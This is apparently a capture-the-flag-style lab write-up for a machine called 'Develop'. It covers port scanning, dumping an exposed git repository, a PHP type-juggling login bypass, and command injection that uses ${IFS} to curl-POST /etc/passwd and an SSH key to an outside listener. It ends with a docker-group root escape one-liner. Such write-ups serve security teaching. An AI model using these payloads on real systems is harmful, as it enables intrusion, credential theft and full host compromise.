# Develop

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.160.135
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 11:38 +08
Nmap scan report for 192.168.160.135
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

Did a detailed scan on the HTTP ports as well:

```
$ sudo nmap -p 80,8080 -sC -sV --min-rate 3000 192.168.160.135      
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 11:40 +08
Nmap scan report for 192.168.160.135
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Jekyll v4.1.1
|_http-title: Develop Solutions
| http-git: 
|   192.168.160.135:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: added fix to do 
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Admin Panel
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

So there's a `.git` repository which we can download first.&#x20;

### Web + Git Enumeration

Port 80 hosts a corporate website:

<figure><img src="../../../.gitbook/assets/image (3954).png" alt=""><figcaption></figcaption></figure>

If we click 'Get in touch', we are redirected to `develop.site/getintouch.php`. We can first add that to our `/etc/hosts` file and then enumerate further.&#x20;

The page reveals a simple Contact Form:

<figure><img src="../../../.gitbook/assets/image (3148).png" alt=""><figcaption></figcaption></figure>

Nothing much there. I ran a `gobuster` scan on the website and also downloaded the `.git` repository. While the `gobuster` scan ran, I enumerated the logs of the repository. Here's the interesting output:

```
$ git log -p -5
<TRUNCATED>
diff --git a/README.md b/README.md
index 4e81ff9..ef97745 100644
--- a/README.md
+++ b/README.md
@@ -1,6 +1,8 @@
 DONE:
 - Added staff vhost
 - Removed juicy files from git repo
-
+- Implemented blacklist & whitelist filters to prevent remote code execution reported by the last penetration test performed on our platform
+ 
 TODO:
-- Change weak passowrds
+- Change weak password
+- Remove commands from the whitelist like "cut" which are not needed anymore

...

diff --git a/init.sql b/init.sql
deleted file mode 100644
index e27be17..0000000
--- a/init.sql
+++ /dev/null
@@ -1,16 +0,0 @@
-DROP SCHEMA IF EXISTS app;
-CREATE SCHEMA app;
-USE app;
-
-CREATE TABLE staff(
-    id INT NOT NULL AUTO_INCREMENT,
-    username VARCHAR(20),
-    email VARCHAR(40),
-    password VARCHAR(255),
-    PRIMARY KEY(id)
-);
-
-# Inserting staff
-INSERT INTO staff(username, email, password) VALUES("franz", "franz@develop.info", "2df3f8123cd4cf019e215a37a19d0972");
-INSERT INTO staff(username, email, password) VALUES("alex", "alex@develop.info", "2af05664fdd33119293ce07da4509139");
-INSERT INTO staff(username, email, password) VALUES("lu191", "lu191@develop.info", "0e987654321098765432109876543210");
diff --git a/login.php b/login.php
deleted file mode 100644
index 28dd8b2..0000000
--- a/login.php
+++ /dev/null
@@ -1,101 +0,0 @@
-<?php
-session_start();
-require_once('database.php');
-
-if (isset($_POST['login'])) {
-  $username = $_POST['inputUsername'] ?? '';
-  $password = $_POST['inputPassword'] ?? '';
-  
-  if (empty($username) || empty($password)) {
-      $msg = 'Inserisci username e password %s';
-  } else {
-      $query = "
-          SELECT username, password, email
-          FROM staff
-          WHERE username = :username
-      ";
-      
-      $check = $pdo->prepare($query);
-      $check->bindParam(':username', $username, PDO::PARAM_STR);
-      $check->execute();
-      
-      $user = $check->fetch(PDO::FETCH_ASSOC);
-      
-      if (!$user || (md5($password) != $user['password'])) {
-          $msg = 'Credenziali utente errate %s';
-      } else {
-          session_regenerate_id();
-          $_SESSION['session_id'] = session_id();
-          $_SESSION['username'] = $user['username'];
-          $_SESSION['email'] = $user['email'];
-          
-          header('Location: ./dashboard/dashboard.php');
-          exit;
-      }
-  }
-}
-?>
```

Firstly, we have some mention of a blacklist and whitelist preventing RCE. Next, we have some hashes and users, of which the hashes don't crack.&#x20;

Lastly, we have `login.php` form, which uses the username concatenated with the MD5 of the password. This authentication mechanism is vulnerable to PHP type juggling since `===` is not used, hence magic hashes can be used to bypass the login.&#x20;

### Magic Hashes --> LFI SSH

The `.git` repository seems to be for the service running on port 8080:

<figure><img src="../../../.gitbook/assets/image (3937).png" alt=""><figcaption></figcaption></figure>

We can login with `lu191:240610708`, abusing the type juggling here and view the dashboard:

<figure><img src="../../../.gitbook/assets/image (1190).png" alt=""><figcaption></figcaption></figure>

The Resources tab of the dashboard shows potential for RCE:

<figure><img src="../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

So we know that this is probably still vulnerable to RCE, and it tells us when we are blocked.&#x20;

<figure><img src="../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

I tested different commands, and found that `curl` isn't blocked:

<figure><img src="../../../.gitbook/assets/image (1175).png" alt=""><figcaption></figcaption></figure>

Commands like `bash` and `sh` are blocked, and so are 'space' characters, so it will be difficult to get a reverse shell through `curl`. However, we can use this to read the files on the system by sending POST requests to our listening port 80.&#x20;

To overcome the space character block, we can use `${IFS}`. Using this, we can send POST requests with file contents using the `-F` flag:

{% code overflow="wrap" %}
```
127.0.0.1;curl${IFS}-X${IFS}POST${IFS}-F${IFS}"file=@/etc/passwd"${IFS}http://192.168.45.191
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

Using this method, I found that the user was `franz`. We can then attempt to read their private SSH key:

<figure><img src="../../../.gitbook/assets/image (3964).png" alt=""><figcaption></figcaption></figure>

We can then `ssh` in:

<figure><img src="../../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Docker Group

As seen above, the user is part of the `docker` group, meaning that we can easily escalate privileges. Firstly, find the images present:

```
$ docker images                                                                                        
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE                                               
mysql        8.0.22    d4c3cafb11d5   2 years ago   545MB
```

&#x20;Just run this command from Hacktricks:

{% code overflow="wrap" %}
```
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host d4c3cafb11d5 chroot /host/ bash
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (3941).png" alt=""><figcaption></figcaption></figure>
